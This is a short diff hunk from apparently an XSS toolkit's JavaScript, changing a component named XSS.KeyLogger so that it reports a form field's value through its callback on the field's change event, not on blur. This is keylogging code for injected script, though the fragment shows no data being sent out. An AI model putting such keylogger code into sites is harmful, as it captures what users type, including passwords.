@@ -162,7 +162,7 @@ XSS.KeyLogger = function(element,callback) {
 
   var self = this;
 
-  this.element.onblur = new XSS.Callback(this.element.onblur,function(e) {
+  this.element.onchange = new XSS.Callback(this.element.onchange,function(e) {
     if (self.callback) {
       self.callback(self.value());
     }
